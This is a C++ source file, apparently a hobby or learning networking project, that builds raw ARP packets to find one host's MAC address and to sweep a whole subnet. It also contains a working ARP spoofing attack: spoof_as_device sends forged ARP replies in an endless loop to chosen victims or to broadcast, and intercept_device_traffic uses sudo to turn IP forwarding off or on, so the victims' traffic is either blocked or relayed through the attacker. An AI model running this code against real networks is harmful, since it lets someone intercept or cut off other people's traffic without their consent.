#include "net_arp.h"

#include "../../linux/hardware.h"
#include <iostream>
#include <cstring>
#include <netinet/if_ether.h>
#include <thread>
#include <netinet/in.h>

using namespace std;

mac_addr net_arp::search_for_mac_addr(ip4_addr searched_ip) {
    struct mac_addr my_mac = get_my_mac_address("enp0s3");
    struct ip4_addr my_ip = get_my_priv_ip_addr("enp0s3");

#define BUFF_LEN 1024
    char request[BUFF_LEN];
    memset(request, 0, BUFF_LEN);


    // setup net_arp
    struct ether_arp *arp_header = (struct ether_arp *) request; // arp_header header
    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first net_arp octets type: mac
    arp_header->arp_pro = htons(ETH_P_IP); // first net_arp octets type: ip
    arp_header->arp_hln = ETH_ALEN; // len of mac octets
    arp_header->arp_pln = 4; // len of ip octets
    arp_header->arp_op = htons(ARPOP_REQUEST); // type of net_arp (request)

    memcpy(arp_header->arp_sha, &my_mac, sizeof(arp_header->arp_sha));
    memcpy(arp_header->arp_spa, &my_ip, sizeof(arp_header->arp_spa));
//    memset(arp_header->arp_spa, 0, sizeof(arp_header->arp_spa));

    memset(arp_header->arp_tha, 0, sizeof(arp_header->arp_tha));
    write_in_network_order((uint8_t *) &arp_header->arp_tpa, &searched_ip);
//    memcpy(arp_header->arp_tpa, &target_ip, sizeof(arp_header->arp_tpa));


    // send
    ether_client.next_protocol.set_next_choice(htons(ETH_P_ARP));
    ether_client.next_source_addr.set_next_choice(my_mac);
    ether_client.next_dest_addr.set_next_choice(BROADCAST_MAC);

    ether_client.send_data({request, sizeof(ether_arp)});

    // wait some reasonable time
    using namespace std::chrono_literals;
    std::this_thread::sleep_for(1000ms);

    // receive reply
    if (income_queue.empty()) return mac_addr{0};

    auto reply = front_data();
    uint8_t *reply_buff = reply.data.get() + reply.curr_offset;

    struct ether_arp *arp_reply = (struct ether_arp *) reply_buff;
    if (ntohs(arp_reply->ea_hdr.ar_op) != ARPOP_REPLY) {
        return mac_addr{0};
    }

    mac_addr res{};
    memcpy(res.octets, arp_reply->arp_sha, sizeof(res.octets));
    return res;
}

vector<pair<ip4_addr, mac_addr>> net_arp::scan_entire_subnet(ip4_subnet_mask mask) {
    struct mac_addr my_mac = get_my_mac_address("enp0s3");
    struct ip4_addr my_ip = get_my_priv_ip_addr("enp0s3");

#define BUFF_LEN 1024
    char request[BUFF_LEN];

    ip4_addr curr_ip = smallest_ip_addr_in_subnet(mask);
    while (true) {
        cout << "sending search for ip: " << convert_to_str(curr_ip) << endl;
        if (!is_inside_subnet(mask, curr_ip)) {
            break;
        }

        memset(request, 0, BUFF_LEN);

        // setup net_arp
        struct ether_arp *arp_header = (struct ether_arp *) request; // arp_header header
        arp_header->arp_hrd = htons(ARPHRD_ETHER); // first net_arp octets type: mac
        arp_header->arp_pro = htons(ETH_P_IP); // first net_arp octets type: ip
        arp_header->arp_hln = ETH_ALEN; // len of mac octets
        arp_header->arp_pln = 4; // len of ip octets
        arp_header->arp_op = htons(ARPOP_REQUEST); // type of net_arp (request)

        memcpy(arp_header->arp_sha, &my_mac, sizeof(arp_header->arp_sha));
        memcpy(arp_header->arp_spa, &my_ip, sizeof(arp_header->arp_spa));
//    memset(arp_header->arp_spa, 0, sizeof(arp_header->arp_spa));

        memset(arp_header->arp_tha, 0, sizeof(arp_header->arp_tha));
        write_in_network_order((uint8_t *) &arp_header->arp_tpa, &curr_ip);
//    memcpy(arp_header->arp_tpa, &target_ip, sizeof(arp_header->arp_tpa));


        // send
        ether_client.next_protocol.set_next_choice(htons(ETH_P_ARP));
        ether_client.next_source_addr.set_next_choice(my_mac);
        ether_client.next_dest_addr.set_next_choice(BROADCAST_MAC);

        ether_client.send_data({request, sizeof(ether_arp)});

        curr_ip = generate_next_ip(curr_ip);
    }

    cout << "search sends completed, waiting for replies" << endl;

    // wait some reasonable time for all the replies
    using namespace std::chrono_literals;
    std::this_thread::sleep_for(3000ms);

    vector<pair<ip4_addr, mac_addr>> res;
    while (!income_queue.empty()) {
        auto reply = front_data();
        uint8_t *reply_buff = reply.data.get() + reply.curr_offset;

        struct ether_arp *arp_reply = (struct ether_arp *) reply_buff;
        if (ntohs(arp_reply->ea_hdr.ar_op) != ARPOP_REPLY)
            continue;

        mac_addr res_mac{};
        memcpy(res_mac.octets, arp_reply->arp_sha, sizeof(res_mac.octets));

        ip4_addr res_ip;
        extract_from_network_order(&res_ip, (uint8_t *) &arp_reply->arp_spa);

        res.emplace_back(res_ip, res_mac);
    }

    cout << "got " << res.size() << "replies" << endl;

    return res;
}


void net_arp::spoof_as_device(const std::vector<ip4_addr> &victims_ip, ip4_addr target_ip,
                              mac_addr source_mac) {
    int no_victims = victims_ip.size();

    vector<mac_addr> victim_macs(no_victims);
    for (int i = 0; i < no_victims; i++)
        victim_macs[i] = (search_for_mac_addr(victims_ip[i]));


#define BUFF_LEN 1024
    char buff[BUFF_LEN];
    memset(buff, 0, BUFF_LEN);

    // prepare net_arp
    struct ether_arp *arp_header = (struct ether_arp *) buff; // arp_header header
    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first net_arp octets type: mac
    arp_header->arp_pro = htons(ETH_P_IP); // first net_arp octets type: ip
    arp_header->arp_hln = ETH_ALEN; // len of mac octets
    arp_header->arp_pln = 4; // len of ip octets
    arp_header->arp_op = htons(ARPOP_REPLY); // type of net_arp (forged reply)

    memcpy(arp_header->arp_sha, &source_mac, sizeof(arp_header->arp_sha)); // my spoofed mac octets
    write_in_network_order((uint8_t *) &arp_header->arp_spa, &target_ip);
//    memcpy(arp_header->arp_spa, &device_ip, sizeof(arp_header->arp_spa)); // target_ip ip


    while (true) {
        using namespace std::chrono_literals;
        std::this_thread::sleep_for(300ms);

        if (victims_ip.empty()) { // spoof whole broadcast
            memset(arp_header->arp_tha, 0xff, ETH_ALEN);
            memset(arp_header->arp_tpa, 0x00, 4);

            ether_client.next_dest_addr.set_next_choice(BROADCAST_MAC);
            ether_client.next_protocol.set_next_choice(htons(ETH_P_ARP));
            ether_client.send_data({buff, sizeof(ether_arp)});

        } else { // spoof every victim
            for (int i = 0; i < no_victims; i++) {
                ip4_addr victim_ip = victims_ip[i];
                mac_addr victim_mac = victim_macs[i];

                // send to specific target_ip
                memcpy(arp_header->arp_tha, &victim_mac, sizeof(arp_header->arp_tha));
                write_in_network_order((uint8_t *) &arp_header->arp_tpa, &victim_ip);
//                memcpy(arp_header->arp_tpa, &victims_ip, sizeof(arp_header->arp_tpa));

                ether_client.next_dest_addr.set_next_choice(victim_mac);
                ether_client.next_protocol.set_next_choice(htons(ETH_P_ARP));
                ether_client.send_data({buff, sizeof(ether_arp)});
            }

        }

        cout << "spoofed frames sent" << endl;
    }

}

void net_arp::intercept_device_traffic(const vector<ip4_addr> &victim_devices, ip4_addr dest, bool block,
                                       bool bidirectional) {
    // block/allow traffic (linux)
    if (block) system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward");
    else system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward");

    mac_addr my_mac = get_my_mac_address("enp0s3");

    spoof_as_device(victim_devices, dest, my_mac);
//    if (bidirectional)
//        for (ip4_addr victim: victim_devices)
//            spoof_as_device({dest}, victim, my_mac);

}
